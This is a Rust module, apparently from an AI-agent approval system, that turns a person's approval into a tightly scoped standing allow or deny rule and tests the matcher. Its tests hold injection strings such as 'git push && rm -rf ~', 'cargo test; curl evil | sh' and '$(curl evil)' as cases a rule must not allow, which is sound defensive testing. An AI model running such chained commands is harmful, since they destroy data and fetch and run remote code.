//! Standing rules (T1.6b): a person's decision, kept beyond the one action it was made for, and
//! the matcher that holds it to exactly that action.
//!
//! # Where a rule comes from
//!
//! A person answers an approval in the Inbox and picks how far the answer reaches
//! ([`Remember`]): this run, this bot, or always. The daemon turns the answer into a
//! [`StandingRule`] whose [`RuleMatcher`] is derived from the approval's structured subject
//! ([`RuleMatcher::derive`]) and is never broader than it. Rules are evaluated by the run
//! supervisor before it asks anyone; the precedence against the policy file is in
//! `reno-kernel`'s `supervisor::approval` docs.
//!
//! # Matching (pure: no clock, no file system)
//!
//! A matcher states four things and **all of them must hold**. Unlike a policy rule, a thing it
//! leaves out is not a wildcard: it means the subject has none of it.
//!
//! - `action`: the subject's [`ActionClass`] is equal.
//! - `tool`: the subject's tool name is equal, as a string (no glob).
//! - `command`: absent means the subject has **no** command. [`CommandPattern::Exact`] is string
//!   equality with the whole line. [`CommandPattern::Glob`] is a policy `command` glob.
//! - `paths`: empty means the subject has **no** paths. Otherwise each entry is a policy `path`
//!   glob (`/` starts an outside-the-worktree glob; anything else is relative to the run's
//!   worktree), and the subject's paths are judged by the same lexical rules as the policy's
//!   (`..` escapes are outside; symlinks are not followed).
//!
//! The effect decides how a command line or several paths are read, exactly as in the policy
//! (see `defs::evaluate`, "Commands" and "Paths"):
//!
//! - **allow**: an exact command must equal the whole line, so `git push` never allows
//!   `git push --force` or `git push && rm -rf ~`. A glob never matches a line that chains,
//!   substitutes or redirects. Every one of the subject's paths must match one of the rule's.
//! - **deny**: the whole line, or any one simple command in it, must equal (or match) the
//!   command, so `git push --force` is still refused inside `true && git push --force`. Any one
//!   of the subject's paths matching is enough.
//!
//! A rule derived from an inside path (`src/lib.rs`) therefore never matches a path outside the
//! worktree, and one derived from an outside path (`/etc/hosts`) never matches an inside one.
//! A rule derived from a subject that has only a tool (a fetch has no command and no paths) is a
//! grant for that whole tool: say so when showing it.

use std::path::Path;

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

use crate::defs::{
    PolicyEffect, command_holds, lexical, locate_text, path_matches, pure_pipeline_head,
};
use crate::exec::{ActionClass, ApprovalSubject};
use crate::ids::{ApprovalId, RuleId, RunId};

/// The longest `expiresInSecs` of a [`Remember`]: a year.
pub const RULE_MAX_EXPIRY_SECS: u64 = 366 * 24 * 60 * 60;

/// Feature: `rule.list` and `rule.revoke` exist, `approval.decide` takes `remember`, and a
/// decision may be made by a standing rule (`ResolvedBy::Rule` named `standing:<rule id>`).
pub const FEATURE_RULES: &str = "rules";

/// The name a decision made by a standing rule carries in `ResolvedBy::Rule`.
pub fn standing_rule_name(id: &RuleId) -> String {
    format!("standing:{id}")
}

/// How far a person's answer reaches. `once` is a plain answer with no `remember`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum RememberScope {
    /// Every later matching action of this run.
    Run,
    /// Every later matching action of any run of this run's bot. Refused for a run with no bot.
    Bot,
    /// Every later matching action, whatever the run or bot.
    Always,
}

/// What `approval.decide` may add: keep this decision as a standing rule.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase")]
pub struct Remember {
    /// How far the rule reaches.
    pub scope: RememberScope,
    /// The rule stops applying this many seconds after it is made. Absent: it holds until
    /// revoked (a `run` rule ends with its run in any case). At most [`RULE_MAX_EXPIRY_SECS`];
    /// zero is refused.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub expires_in_secs: Option<u64>,
}

/// Where a standing rule applies.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize, JsonSchema)]
#[serde(
    tag = "type",
    rename_all = "snake_case",
    rename_all_fields = "camelCase"
)]
pub enum StandingScope {
    /// One run.
    Run {
        /// The run.
        run: RunId,
    },
    /// Every run of one bot.
    Bot {
        /// The bot's name.
        bot: String,
    },
    /// Every run.
    Always,
}

/// What a standing rule does when it matches.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum StandingEffect {
    /// The harness is told yes, unasked.
    Allow,
    /// The harness is told no, unasked.
    Deny,
}

impl StandingEffect {
    fn policy(self) -> PolicyEffect {
        match self {
            Self::Allow => PolicyEffect::Allow,
            Self::Deny => PolicyEffect::Deny,
        }
    }
}

/// How a rule matches a command line.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize, JsonSchema)]
#[serde(
    tag = "type",
    rename_all = "snake_case",
    rename_all_fields = "camelCase"
)]
pub enum CommandPattern {
    /// The line, character for character. What a rule derived from a subject holds.
    Exact {
        /// The command line.
        command: String,
    },
    /// A policy `command` glob (`cargo *`), read by the policy's compound-command rules. Only a
    /// person who edits a rule gets one; nothing derives it.
    Glob {
        /// The glob.
        pattern: String,
    },
}

/// What a standing rule matches. See the module docs for what each part means and what leaving
/// one out means.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase")]
pub struct RuleMatcher {
    /// The action class, equal.
    pub action: ActionClass,
    /// The tool name, equal.
    pub tool: String,
    /// The command; absent means the subject has no command.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<CommandPattern>,
    /// Path globs; empty means the subject has no paths.
    #[serde(default)]
    pub paths: Vec<String>,
}

/// Escapes the glob metacharacters of `text`, so the glob matches exactly `text`.
fn escape_glob(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if matches!(c, '*' | '?' | '[' | ']' | '{' | '}' | '\\') {
            out.push('\\');
        }
        out.push(c);
    }
    out
}

impl RuleMatcher {
    /// The matcher that holds exactly `subject`: its action and tool, its command as written,
    /// and each of its paths located against the worktree `cwd` (inside paths relative to it,
    /// so the rule follows a bot to its next worktree; outside paths absolute), glob-escaped so
    /// a name with `*` in it matches only itself.
    pub fn derive(subject: &ApprovalSubject, cwd: &Path) -> Self {
        let cwd = lexical(cwd);
        let mut paths: Vec<String> = Vec::new();
        for path in &subject.paths {
            let (_, text) = locate_text(&cwd, path);
            let glob = escape_glob(&text);
            if !paths.contains(&glob) {
                paths.push(glob);
            }
        }
        Self {
            action: subject.action,
            tool: subject.tool.clone(),
            command: subject
                .command
                .clone()
                .map(|command| CommandPattern::Exact { command }),
            paths,
        }
    }

    /// Whether this matcher holds `subject`, read as a rule with `effect` in the run whose
    /// worktree is `cwd`. Pure.
    pub fn matches(&self, effect: StandingEffect, cwd: &Path, subject: &ApprovalSubject) -> bool {
        if self.action != subject.action || self.tool != subject.tool {
            return false;
        }
        let effect = effect.policy();
        let command_ok = match (&self.command, &subject.command) {
            (None, None) => true,
            (Some(CommandPattern::Exact { command }), Some(line)) => match effect {
                PolicyEffect::Deny | PolicyEffect::Ask => {
                    line == command || split_simple(line).any(|part| part == command.trim())
                }
                PolicyEffect::Allow => {
                    line == command || pure_pipeline_head(line) == Some(command.as_str())
                }
            },
            (Some(CommandPattern::Glob { pattern }), Some(line)) => {
                command_holds(effect, pattern, line)
            }
            _ => false,
        };
        if !command_ok {
            return false;
        }
        let cwd = lexical(cwd);
        match (self.paths.is_empty(), subject.paths.is_empty()) {
            (true, true) => true,
            (true, false) | (false, true) => false,
            (false, false) => {
                let one = |path: &std::path::PathBuf| {
                    self.paths.iter().any(|glob| path_matches(glob, &cwd, path))
                };
                match effect {
                    PolicyEffect::Allow => subject.paths.iter().all(one),
                    PolicyEffect::Deny | PolicyEffect::Ask => subject.paths.iter().any(one),
                }
            }
        }
    }
}

/// The simple commands of a line: cut at the characters the policy cuts at, trimmed, not empty.
fn split_simple(line: &str) -> impl Iterator<Item = &str> {
    line.split([';', '&', '|', '\n', '\r', '`', '(', ')'])
        .map(str::trim)
        .filter(|part| !part.is_empty())
}

/// A standing rule as stored and as `rule.list` returns it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase")]
pub struct StandingRule {
    /// The rule's id, as `rule.revoke` refers to it.
    pub id: RuleId,
    /// Where it applies.
    pub scope: StandingScope,
    /// What it does.
    pub effect: StandingEffect,
    /// What it matches.
    pub matcher: RuleMatcher,
    /// Who made it: `human`.
    pub created_by: String,
    /// When, in milliseconds since the Unix epoch.
    pub created_at_ms: u64,
    /// When it stops applying. Absent: when revoked.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub expires_at_ms: Option<u64>,
    /// When it was revoked. Absent while it is not.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub revoked_at_ms: Option<u64>,
    /// The approval whose answer it came from.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_approval: Option<ApprovalId>,
}

impl StandingRule {
    /// Whether the rule applies at `now_ms`: not revoked and not past its expiry.
    pub fn is_active(&self, now_ms: u64) -> bool {
        self.revoked_at_ms.is_none() && self.expires_at_ms.is_none_or(|at| now_ms < at)
    }
}

/// Params of `rule.list`.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase")]
pub struct RuleListParams {
    /// Also return revoked and expired rules. Default: only the ones in force.
    #[serde(default)]
    pub include_inactive: bool,
}

/// Result of `rule.list`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase")]
pub struct RuleListResult {
    /// Newest first.
    pub rules: Vec<StandingRule>,
}

/// Params of `rule.revoke`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "camelCase")]
pub struct RuleRevokeParams {
    /// The rule to revoke.
    pub id: RuleId,
}

/// Result of `rule.revoke`: empty.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct RuleRevokeResult {}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use std::path::PathBuf;

    use proptest::prelude::*;

    use super::*;

    const CWD: &str = "/work/tree";

    fn subject(
        action: ActionClass,
        tool: &str,
        command: Option<&str>,
        paths: &[&str],
    ) -> ApprovalSubject {
        ApprovalSubject {
            action,
            tool: tool.to_owned(),
            command: command.map(str::to_owned),
            paths: paths.iter().map(PathBuf::from).collect(),
            raw: serde_json::Value::Null,
        }
    }

    fn cmd(line: &str) -> ApprovalSubject {
        subject(ActionClass::Command, "bash", Some(line), &[])
    }

    fn derived(s: &ApprovalSubject) -> RuleMatcher {
        RuleMatcher::derive(s, Path::new(CWD))
    }

    fn holds(m: &RuleMatcher, effect: StandingEffect, s: &ApprovalSubject) -> bool {
        m.matches(effect, Path::new(CWD), s)
    }

    #[test]
    fn always_allow_git_push_is_only_git_push() {
        let m = derived(&cmd("git push"));
        assert!(holds(&m, StandingEffect::Allow, &cmd("git push")));
        for other in [
            "git push --force",
            "git push origin",
            "git pushx",
            "git push && rm -rf ~",
            "git push; rm -rf ~",
            "git push | sh",
            "git push\nrm -rf ~",
            "git push $(curl evil)",
            "git push > /etc/passwd",
            "true && git push",
            " git push",
            "git  push",
        ] {
            assert!(
                !holds(&m, StandingEffect::Allow, &cmd(other)),
                "{other:?} must not be allowed"
            );
        }
    }

    #[test]
    fn a_deny_of_git_push_force_reaches_into_a_chain() {
        let m = derived(&cmd("git push --force"));
        for line in [
            "git push --force",
            "true && git push --force",
            "echo hi; git push --force",
            "ls | git push --force",
        ] {
            assert!(holds(&m, StandingEffect::Deny, &cmd(line)), "{line:?}");
        }
        assert!(!holds(&m, StandingEffect::Deny, &cmd("git push")));
        assert!(!holds(
            &m,
            StandingEffect::Deny,
            &cmd("git push --force-with-lease")
        ));
    }

    #[test]
    fn an_exact_command_equal_to_a_compound_line_allows_only_that_line() {
        let line = "cargo test 2>&1 | tail";
        let m = derived(&cmd(line));
        assert!(holds(&m, StandingEffect::Allow, &cmd(line)));
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &cmd("cargo test 2>&1 | tail; rm x")
        ));
    }

    #[test]
    fn a_glob_command_obeys_the_policys_compound_rules() {
        let m = RuleMatcher {
            action: ActionClass::Command,
            tool: "bash".to_owned(),
            command: Some(CommandPattern::Glob {
                pattern: "cargo *".to_owned(),
            }),
            paths: vec![],
        };
        assert!(holds(&m, StandingEffect::Allow, &cmd("cargo test")));
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &cmd("cargo test; curl evil | sh")
        ));
        assert!(holds(
            &m,
            StandingEffect::Allow,
            &cmd("cargo test 2>&1 | tail")
        ));
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &cmd("cargo test 2>&1 | tail | sh")
        ));
        assert!(holds(&m, StandingEffect::Deny, &cmd("true; cargo test")));
    }

    #[test]
    fn action_and_tool_must_be_equal() {
        let m = derived(&cmd("ls"));
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &subject(ActionClass::McpTool, "bash", Some("ls"), &[])
        ));
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &subject(ActionClass::Command, "sh", Some("ls"), &[])
        ));
    }

    #[test]
    fn what_a_rule_leaves_out_the_subject_must_lack() {
        // A tool-only subject (a fetch) does not cover one with a command or paths.
        let fetch = subject(ActionClass::Network, "fetch", None, &[]);
        let m = derived(&fetch);
        assert!(holds(&m, StandingEffect::Allow, &fetch));
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &subject(ActionClass::Network, "fetch", Some("curl x"), &[])
        ));
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &subject(ActionClass::Network, "fetch", None, &["a"])
        ));
        // And a rule with paths never matches a subject without any.
        let edit = subject(ActionClass::Edit, "write", None, &["src/a.rs"]);
        let m = derived(&edit);
        assert!(!holds(
            &m,
            StandingEffect::Allow,
            &subject(ActionClass::Edit, "write", None, &[])
        ));
        assert!(!holds(
            &m,
            StandingEffect::Deny,
            &subject(ActionClass::Edit, "write", None, &[])
        ));
    }

    #[test]
    fn an_inside_path_rule_never_matches_outside_and_the_reverse() {
        let m = derived(&subject(
            ActionClass::Edit,
            "write",
            None,
            &["/work/tree/src/a.rs"],
        ));
        assert_eq!(m.paths, vec!["src/a.rs".to_owned()]);
        let edit = |p: &str| subject(ActionClass::Edit, "write", None, &[p]);
        assert!(holds(&m, StandingEffect::Allow, &edit("src/a.rs")));
        assert!(holds(
            &m,
            StandingEffect::Allow,
            &edit("/work/tree/src/./a.rs")
        ));
        for outside in [
            "/src/a.rs",
            "/etc/passwd",
            "../src/a.rs",
            "src/../../a.rs",
            "/work/tree/../src/a.rs",
            "/work/tree-other/src/a.rs",
        ] {
            assert!(
                !holds(&m, StandingEffect::Allow, &edit(outside)),
                "{outside}"
            );
            assert!(
                !holds(&m, StandingEffect::Deny, &edit(outside)),
                "{outside}"
            );
        }
        let out = derived(&edit("/etc/hosts"));
        assert_eq!(out.paths, vec!["/etc/hosts".to_owned()]);
        assert!(holds(&out, StandingEffect::Allow, &edit("/etc/hosts")));
        assert!(!holds(&out, StandingEffect::Allow, &edit("etc/hosts")));
        assert!(!holds(&out, StandingEffect::Allow, &edit("/etc/passwd")));
    }

    #[test]
    fn a_name_with_glob_characters_matches_only_itself() {
        let m = derived(&subject(
            ActionClass::Edit,
            "write",
            None,
            &["src/*.rs", "a[1].txt"],
        ));
        let edit = |p: &str| subject(ActionClass::Edit, "write", None, &[p]);
        assert!(holds(&m, StandingEffect::Allow, &edit("src/*.rs")));
        assert!(!holds(&m, StandingEffect::Allow, &edit("src/lib.rs")));
        assert!(holds(&m, StandingEffect::Allow, &edit("a[1].txt")));
        assert!(!holds(&m, StandingEffect::Allow, &edit("a1.txt")));
    }

    #[test]
    fn allow_needs_every_path_and_deny_any() {
        let m = derived(&subject(ActionClass::Edit, "write", None, &["a", "b"]));
        let two = |p: &[&str]| subject(ActionClass::Edit, "write", None, p);
        assert!(holds(&m, StandingEffect::Allow, &two(&["a", "b"])));
        assert!(holds(&m, StandingEffect::Allow, &two(&["a"])));
        assert!(!holds(&m, StandingEffect::Allow, &two(&["a", "c"])));
        assert!(holds(&m, StandingEffect::Deny, &two(&["a", "c"])));
        assert!(!holds(&m, StandingEffect::Deny, &two(&["c"])));
    }

    #[test]
    fn a_rule_round_trips_and_reports_activity() {
        let rule = StandingRule {
            id: RuleId::from_suffix("a1").unwrap(),
            scope: StandingScope::Bot {
                bot: "scout".to_owned(),
            },
            effect: StandingEffect::Allow,
            matcher: derived(&cmd("git push")),
            created_by: "human".to_owned(),
            created_at_ms: 10,
            expires_at_ms: Some(20),
            revoked_at_ms: None,
            source_approval: None,
        };
        let json = serde_json::to_string(&rule).unwrap();
        assert_eq!(serde_json::from_str::<StandingRule>(&json).unwrap(), rule);
        assert!(rule.is_active(19));
        assert!(!rule.is_active(20));
        let revoked = StandingRule {
            revoked_at_ms: Some(12),
            ..rule
        };
        assert!(!revoked.is_active(11));
    }

    fn arb_command() -> impl Strategy<Value = String> {
        // Words, with the characters the guard cares about mixed in.
        proptest::collection::vec(
            prop_oneof![
                "[a-z]{1,6}",
                Just("--force".to_owned()),
                Just("*".to_owned()),
                Just("$HOME".to_owned()),
            ],
            1..5,
        )
        .prop_map(|words| words.join(" "))
    }

    fn arb_tail() -> impl Strategy<Value = String> {
        (
            prop_oneof![
                Just(";"),
                Just("&&"),
                Just("||"),
                Just("|"),
                Just("&"),
                Just("\n"),
                Just(">"),
                Just("<"),
                Just("`"),
                Just("$("),
                Just("("),
            ],
            "[a-z ~/.-]{0,12}",
        )
            .prop_map(|(op, rest)| format!("{op}{rest}"))
    }

    fn arb_path() -> impl Strategy<Value = String> {
        proptest::collection::vec(
            prop_oneof![
                "[a-z]{1,4}",
                Just("..".to_owned()),
                Just(".".to_owned()),
                Just("*".to_owned()),
                Just("[x]".to_owned()),
            ],
            1..6,
        )
        .prop_flat_map(|parts| {
            prop_oneof![Just(parts.join("/")), Just(format!("/{}", parts.join("/")))]
        })
    }

    proptest! {
        #[test]
        fn a_derived_command_rule_holds_its_own_subject(line in arb_command()) {
            let s = cmd(&line);
            let m = derived(&s);
            prop_assert!(holds(&m, StandingEffect::Allow, &s));
            prop_assert!(holds(&m, StandingEffect::Deny, &s));
        }

        #[test]
        fn an_allow_never_matches_a_different_line(line in arb_command(), other in arb_command()) {
            prop_assume!(line != other);
            prop_assert!(!holds(&derived(&cmd(&line)), StandingEffect::Allow, &cmd(&other)));
        }

        #[test]
        fn an_allow_never_matches_the_line_with_a_chain_or_extra_appended(
            line in arb_command(),
            tail in arb_tail(),
        ) {
            let m = derived(&cmd(&line));
            let longer = format!("{line} {tail}");
            prop_assert!(!holds(&m, StandingEffect::Allow, &cmd(&longer)));
            let glued = format!("{line}{tail}");
            prop_assert!(!holds(&m, StandingEffect::Allow, &cmd(&glued)));
            let after = format!("{tail} {line}");
            prop_assert!(!holds(&m, StandingEffect::Allow, &cmd(&after)));
        }

        #[test]
        fn an_allow_glob_never_matches_a_line_that_chains(
            word in "[a-z]{1,6}",
            tail in arb_tail(),
        ) {
            let m = RuleMatcher {
                action: ActionClass::Command,
                tool: "bash".to_owned(),
                command: Some(CommandPattern::Glob { pattern: format!("{word} *") }),
                paths: vec![],
            };
            let chained = format!("{word} x {tail}");
            prop_assert!(!holds(&m, StandingEffect::Allow, &cmd(&chained)));
        }

        #[test]
        fn a_side_effecting_stage_never_lets_a_standing_allow_match(
            bad in prop_oneof![
                Just("sh"), Just("xargs rm"), Just("tee f"), Just("sort -o f"),
                Just("awk '{print}'"), Just("sed -n 'w f'"), Just("cat f"), Just("tail > f"),
                Just("grep -f f"), Just("tail; rm f"), Just("tail $(id)"),
            ],
            redirect in prop_oneof![Just(""), Just(" 2>&1")],
        ) {
            let line = format!("cargo test{redirect} | tail | {bad}");
            let exact = derived(&cmd("cargo test"));
            let glob = RuleMatcher {
                action: ActionClass::Command,
                tool: "bash".to_owned(),
                command: Some(CommandPattern::Glob { pattern: "cargo *".to_owned() }),
                paths: vec![],
            };
            prop_assert!(!holds(&exact, StandingEffect::Allow, &cmd(&line)), "{}", line);
            prop_assert!(!holds(&glob, StandingEffect::Allow, &cmd(&line)), "{}", line);
            let clean = format!("cargo test{redirect} | tail | head -5");
            prop_assert!(holds(&exact, StandingEffect::Allow, &cmd(&clean)));
            prop_assert!(holds(&glob, StandingEffect::Allow, &cmd(&clean)));
        }

        #[test]
        fn a_deny_reaches_the_command_wherever_it_sits_in_a_chain(
            line in "[a-z]{1,6}( --[a-z]{1,5})?",
            before in "[a-z]{1,6}",
            sep in prop_oneof![Just(";"), Just("&&"), Just("||"), Just("|"), Just("\n")],
            after in "[a-z]{1,6}",
        ) {
            let m = derived(&cmd(&line));
            let chained = format!("{before} {sep} {line} {sep} {after}");
            prop_assert!(holds(&m, StandingEffect::Deny, &cmd(&chained)));
        }

        #[test]
        fn a_derived_rule_never_matches_another_tool_or_class(line in arb_command()) {
            let m = derived(&cmd(&line));
            let other_tool = subject(ActionClass::Command, "other", Some(&line), &[]);
            let other_class = subject(ActionClass::Other, "bash", Some(&line), &[]);
            for effect in [StandingEffect::Allow, StandingEffect::Deny] {
                prop_assert!(!holds(&m, effect, &other_tool));
                prop_assert!(!holds(&m, effect, &other_class));
            }
        }

        #[test]
        fn a_derived_path_rule_holds_its_own_subject_and_follows_the_worktree(path in arb_path()) {
            let s = subject(ActionClass::Edit, "write", None, &[&path]);
            let m = derived(&s);
            prop_assert!(holds(&m, StandingEffect::Allow, &s));
            prop_assert!(holds(&m, StandingEffect::Deny, &s));
            // The same relative spelling in another worktree is the same place for an inside
            // path, and the rule is stated relative to the worktree.
            let elsewhere = Path::new("/other/tree");
            let moved = m.matches(StandingEffect::Allow, elsewhere, &s);
            let located = locate_text(&lexical(Path::new(CWD)), Path::new(&path)).0;
            if located && !path.starts_with('/') {
                prop_assert!(moved);
            }
        }

        #[test]
        fn an_inside_path_rule_never_matches_a_path_that_locates_outside(
            inside in "[a-z]{1,4}(/[a-z]{1,4}){0,3}",
            probe in arb_path(),
        ) {
            let cwd = lexical(Path::new(CWD));
            let m = derived(&subject(ActionClass::Edit, "write", None, &[&inside]));
            let (is_inside, _) = locate_text(&cwd, Path::new(&probe));
            let s = subject(ActionClass::Edit, "write", None, &[&probe]);
            if !is_inside {
                prop_assert!(!holds(&m, StandingEffect::Allow, &s));
                prop_assert!(!holds(&m, StandingEffect::Deny, &s));
            }
        }

        #[test]
        fn an_outside_path_rule_never_matches_an_inside_path(
            outside in "/[a-z]{1,4}(/[a-z]{1,4}){0,3}",
            probe in arb_path(),
        ) {
            let cwd = lexical(Path::new(CWD));
            prop_assume!(!locate_text(&cwd, Path::new(&outside)).0);
            let m = derived(&subject(ActionClass::Edit, "write", None, &[&outside]));
            let s = subject(ActionClass::Edit, "write", None, &[&probe]);
            if locate_text(&cwd, Path::new(&probe)).0 {
                prop_assert!(!holds(&m, StandingEffect::Allow, &s));
            }
        }
    }
}
